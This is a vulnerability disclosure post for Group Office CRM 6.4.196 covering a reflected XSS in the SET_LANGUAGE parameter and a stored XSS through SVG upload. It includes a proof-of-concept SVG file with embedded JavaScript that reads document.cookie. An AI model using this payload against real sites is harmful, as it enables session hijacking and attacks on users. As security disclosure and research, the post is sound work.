---
title: Group Office CRM | Stored XSS via SVG File
author: Fatih Çelik
date: 2020-12-10 11:33:00 +0800
categories: [Vulnerability Research]
tags: [vulnerability research]
math: true
mermaid: true
---

**Software**: https://sourceforge.net/projects/group-office/

**Version**: 6.4.196

**Vulnerability**: Cross Site Scripting

**CVE**: CVE-2020-35418 && CVE-2020-35419

**Description of the product:**

> Group Office is an open source groupware application. It makes your daily office tasks easier. Share projects, calendars, files and e-mail online. It is a complete solution for all your online office needs. From a customer phone call to a project and finally an invoice. The support system helps to keep your customers happy. Group Office is fast, secure and has privacy by design. You can stay in full control of your data by self hosting your cloud and e-mail. Our document editing solution keeps all data on the secured server instead of synchronising it to all user devices. GroupOffice is open source and modular. Which means it’s easy to customise and extend. You can turn off and on features and it enables any developer to create new modules for the platform.

## Description of the vulnerability

There are 2 XSS vulnerability on the web application. One of them is reflected XSS and the other one is stored XSS. The "SET_LANGUAGE" parameter is affected by reflected XSS vulnerability. In addition to that, in contact page, users can upload svg files via file upload functionality. Attacker can inject JS code into the svg file and due to the insecure handling of crafted svg file, attacker can perform XSS attack.

## Exploit

Content of the poc.svg file,

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
 <svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
<script type="text/javascript">
alert(document.cookie);
</script>
</svg>
```

![](/photos/poc-1.png)

![](/photos/poc-2.png)
